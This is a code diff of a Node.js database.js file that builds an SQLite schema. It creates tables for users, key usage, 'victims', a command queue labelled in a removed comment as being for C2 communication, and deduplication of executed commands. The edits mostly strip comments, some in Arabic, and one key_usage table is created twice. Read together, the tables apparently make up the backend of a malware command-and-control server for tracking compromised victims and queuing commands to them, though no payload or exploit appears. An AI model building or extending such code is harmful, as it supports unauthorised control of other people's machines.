@@ -1,4 +1,3 @@
-// database.js
 const sqlite = require('sqlite');
 const sqlite3 = require('sqlite3');
 
@@ -9,7 +8,6 @@ async function setupDatabase() {
             driver: sqlite3.Database
         });
 
-        // إنشاء جدول المستخدمين إذا لم يكن موجودًا
         await db.exec(`
             CREATE TABLE IF NOT EXISTS users (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -22,7 +20,6 @@ async function setupDatabase() {
             );
         `);
 
-        // Force Re-create key_usage table to ensure schema is correct (Dropping old table without key_string)
         try {
             // Check if key_string exists, if not, drop table
             const tableInfo = await db.all("PRAGMA table_info(key_usage)");
@@ -35,7 +32,6 @@ async function setupDatabase() {
             console.error('Error checking table schema:', e);
         }
 
-        // إنشاء أو تحديث جدول استخدام المفاتيح ليشمل نص المفتاح
         await db.exec(`
             CREATE TABLE IF NOT EXISTS key_usage (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -46,7 +42,6 @@ async function setupDatabase() {
             );
         `);
 
-        // إنشاء أو تحديث جدول استخدام المفاتيح ليشمل نص المفتاح
         await db.exec(`
             CREATE TABLE IF NOT EXISTS key_usage (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -57,7 +52,6 @@ async function setupDatabase() {
             );
         `);
 
-        // إنشاء جدول الضحايا (Victims)
         await db.run(`
             CREATE TABLE IF NOT EXISTS victims (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -73,7 +67,6 @@ async function setupDatabase() {
             );
         `);
 
-        // Command Queue Table for C2 Communication
         await db.run(`
             CREATE TABLE IF NOT EXISTS command_queue (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -87,7 +80,6 @@ async function setupDatabase() {
             );
         `);
 
-        // Table for Message Deduplication (Prevents double execution)
         await db.run(`
             CREATE TABLE IF NOT EXISTS processed_messages (
                 message_id TEXT PRIMARY KEY,
@@ -95,7 +87,6 @@ async function setupDatabase() {
             );
         `);
 
-        // Cleanup old processed messages (older than 1 hour) on startup
         const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
         await db.run('DELETE FROM processed_messages WHERE processed_at < ?', oneHourAgo);
 
@@ -103,8 +94,9 @@ async function setupDatabase() {
         return db;
     } catch (error) {
         console.error('Error setting up database:', error);
-        process.exit(1); // أوقف التطبيق إذا فشلت قاعدة البيانات
+        process.exit(1);
     }
 }
 
 module.exports = setupDatabase;
+
